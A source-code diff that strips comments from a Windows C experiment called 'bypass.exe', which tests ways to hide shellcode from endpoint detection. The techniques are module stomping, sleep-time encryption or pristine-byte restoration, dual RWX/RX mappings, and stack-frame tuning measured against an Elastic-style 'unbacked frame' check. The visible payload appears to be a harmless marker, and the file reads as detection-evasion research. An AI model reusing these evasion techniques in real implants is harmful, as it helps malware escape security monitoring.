@@ -1,9 +1,3 @@
-// bypass.exe — integrated single-file sleep-mask experiment.
-// StubSleep (.stb), the stomp target (.pay) and g_shared are compiled into
-// this exe; double-click runs the island experiment then an interactive menu.
-// Modes: -full (control, detected), -idle, -scan, -walk/-walkpriv/-walkmap
-// (stack classification arms), -msgtest, -desktop.
-
 #include <windows.h>
 #include <stdio.h>
 #include <string.h>
@@ -52,8 +46,6 @@ typedef struct Shared {
 } Shared;
 
 static volatile Shared g_shared = {0, 0, 0, 8000, 0xA5, 0, 0, 0, 0, 0, 0};
-
-// dual-view (walkmap) handles: [0]=section, [1]=RW view (write alias)
 static HANDLE g_mapHandles[2] = {0, 0};
 
 // content-restore mode: pristine disk image of StompTarget + the stomped
@@ -62,8 +54,6 @@ static unsigned char g_pristinePay[0x9D] = {0};
 static unsigned char g_shellcodeCopy[0x9D] = {0};
 
 static void MarkStage(const char* s); // defined below; used by StubSleep
-
-// crash diagnostic: log the fault address to stage.txt (temporary)
 static LONG WINAPI CrashFilter(EXCEPTION_POINTERS* ep) {
     char buf[96];
     snprintf(buf, sizeof(buf), "crash at %p (code 0x%lX)",
@@ -74,9 +64,6 @@ static LONG WINAPI CrashFilter(EXCEPTION_POINTERS* ep) {
 }
 
 // ---------------- Elastic-style stack classification ----------------
-// Reproduces Elastic's "Unbacked" frame tag (a frame whose address resolves
-// to no loaded executable image) and the call_stack_contains_unbacked
-// verdict used by the suspicious-unbacked-memory behavior rules.
 extern "C" USHORT WINAPI RtlCaptureStackBackTrace(ULONG framesToSkip,
                                                   ULONG framesToCapture,
                                                   PVOID* backTrace,
@@ -129,10 +116,6 @@ NOINLINE static void WalkAndClassify(void) {
            "call_stack_contains_unbacked=%s\n", unbacked,
            unbacked ? "TRUE (rule would match)" : "false (rule silent)");
 }
-
-// Stomp target. 30 noinline calls force a non-leaf frame (~0xA9 bytes) with
-// the minimal `sub rsp,<imm8>` prologue; the shellcode replicates the imm8
-// (patched by the loader) so .pdata unwind codes match the real stack usage.
 #if defined(_MSC_VER)
 #pragma code_seg(".pay") // MSVC places functions via pragma; GCC via attributes
 #endif
@@ -171,7 +154,6 @@ PAY_SEG NOINLINE static void StompTarget(void) {
     DummyCall();
     g_shared.reserved = 0x12345678;
 }
-
 // Sleep-mask engine: encrypt [shellBase, islandStart) -> SleepEx -> decrypt.
 // .pay is linked RWX, so the XOR works in place — no VirtualProtect, no
 // syscall, zero protection-related API calls. StubSleep itself lives in .stb
@@ -198,9 +180,6 @@ STB_SEG NOINLINE static void StubSleep(void) {
 
     MarkStage("stage: stub before encrypt");
     if (g_shared.restoreContent) {
-        // Content-restore mode: put the page back to its pristine disk
-        // image (StompTarget) while sleeping — no ciphertext, no shellcode
-        // bytes, memory == disk. Woken up: re-stomp the shellcode.
         memcpy(p, g_pristinePay, sizeof(g_pristinePay));
         MarkStage(memcmp(p, g_pristinePay, sizeof(g_pristinePay)) == 0
                       ? "stage: restored pristine OK"
@@ -296,8 +275,6 @@ static const unsigned char kShellcode[0xC0] = {
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // 0xA3 tbl.wf (WriteFile)
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00        // 0xAB tbl.stub
 };
-
-// patch a disp32 slot: slotOff = end of the instruction containing the disp
 static void PatchSlot(unsigned char* shell, ULONGLONG shellBase, size_t slotOff,
                       ULONGLONG target) {
     ULONG disp = (ULONG)(target - (shellBase + slotOff));
@@ -305,7 +282,6 @@ static void PatchSlot(unsigned char* shell, ULONGLONG shellBase, size_t slotOff,
 }
 
 // ---------------- detector integration ----------------
-
 static wchar_t g_detectorPath[MAX_PATH];
 static int g_detectorFound = 0;
 
@@ -473,11 +449,7 @@ static int RunExperiment(const wchar_t* mode) {
         }
         shellBase = (ULONGLONG)(uintptr_t)execBase;
     } else if (mapmode) {
-        // Dual-view live mode: one section mapped twice — RW view for
-        // writes (stomp/encrypt), RX view for execution. No page in the
-        // process is RWX; .pay is never touched (stays pristine on disk).
-        // Views are system-placed: the shellcode calls StubSleep through an
-        // absolute `mov rax,imm64; call rax`, so no +-2GB constraint.
+
         HANDLE hMap = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL,
                                          PAGE_EXECUTE_READWRITE, 0, 0x2000,
                                          NULL);
@@ -516,9 +488,6 @@ static int RunExperiment(const wchar_t* mode) {
     memcpy(shell, kShellcode, sizeof(shell));
     ULONGLONG stubSleepAddr = (ULONGLONG)(uintptr_t)&StubSleep;
 
-    // adapt the shellcode's stack allocation to the compiled stomp target:
-    // `sub rsp,<imm8>` -> mirror the imm8 in shellcode sub/add so .pdata
-    // unwind codes match the actual stack usage during the scan
     {
         unsigned char origPro[4];
         memcpy(origPro, (const void*)&StompTarget, sizeof(origPro));
@@ -532,8 +501,6 @@ static int RunExperiment(const wchar_t* mode) {
         printf("[adapt] stomp-target prologue sub rsp,0x%02X (shellcode matches)\n",
                origPro[3]);
     }
-
-    // Morph-clean addressing: no imm64 constants; rbx and function pointers
     // load via a view-local pointer table (vtable-style call sequence).
     ULONGLONG gSharedAddr = (ULONGLONG)(uintptr_t)&g_shared;
     unsigned char offCalls = (unsigned char)((char*)&g_shared.calls - (char*)&g_shared);
@@ -561,7 +528,7 @@ static int RunExperiment(const wchar_t* mode) {
     PatchSlot(shell, shellBase, 0x3B, shellBase + 0xAB); // lea rax -> tbl.stub
     PatchSlot(shell, shellBase, 0x56, shellBase + 0x9B); // lea rax -> tbl.gsh
     PatchSlot(shell, shellBase, 0x6A, shellBase + 0xA3); // lea rax -> tbl.wf
-    PatchSlot(shell, shellBase, 0x74, shellBase + 0x8F); // lea rdx -> marker "OK\n"
+    PatchSlot(shell, shellBase, 0x74, shellBase + 0x8F); // lea rdx -> marker 
     shell[0x42] = offCalls;                     // slot C (mov eax,[rbx+calls])
     shell[0x47] = offCalls;                     // slot D (mov [rbx+calls],eax)
     shell[0x4A] = offReserved;                  // slot R1 (mov dword [rbx+reserved],1)
@@ -600,8 +567,6 @@ static int RunExperiment(const wchar_t* mode) {
 
     printf("[mode=%ls] pid=%lu StompTarget(shellcode)=%p\n", mode,
            GetCurrentProcessId(), (void*)shellBase);
-
-    // dump the stomped bytes for layout verification
     {
         unsigned char raw[0xC8];
         memcpy(raw, (const void*)shellBase, sizeof(raw));
@@ -632,8 +597,6 @@ static int RunExperiment(const wchar_t* mode) {
            (unsigned long)g_shared.reserved);
     return 0;
 }
-
-// ---------------- main ----------------
 
 int wmain(int argc, wchar_t** argv) {
     SetConsoleOutputCP(CP_UTF8);
